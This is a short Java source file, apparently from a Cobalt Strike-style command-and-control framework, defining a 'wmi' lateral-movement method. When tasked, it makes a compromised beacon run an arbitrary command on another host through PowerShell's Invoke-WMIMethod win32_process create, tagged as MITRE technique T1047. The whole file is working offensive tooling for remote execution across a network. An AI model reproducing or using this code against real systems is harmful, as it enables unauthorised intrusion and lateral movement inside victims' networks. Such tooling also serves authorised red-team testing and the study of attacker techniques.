package beacon.methods;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconRemoteExecMethods;
import beacon.TaskBeacon;

public class WMI implements BeaconRemoteExecMethods.RemoteExecMethod {
    protected AggressorClient client;

    public WMI(AggressorClient aggressorClient) {
        this.client = aggressorClient;
        DataUtils.getBeaconRemoteExecMethods(aggressorClient.getData()).register("wmi", "Remote execute via WMI (PowerShell)", this);
    }

    public void remoteexec(String string1, String string2, String string3) {
        TaskBeacon taskBeacon = new TaskBeacon(this.client, new String[]{string1});
        taskBeacon.log_task(string1, "Tasked beacon to run '" + string3 + "' on " + string2 + " via WMI", "T1047");
        taskBeacon.silent();
        taskBeacon.PowerShellNoImport("Invoke-WMIMethod win32_process -name create -argumentlist '" + string3 + "' -ComputerName " + string2);
    }
}
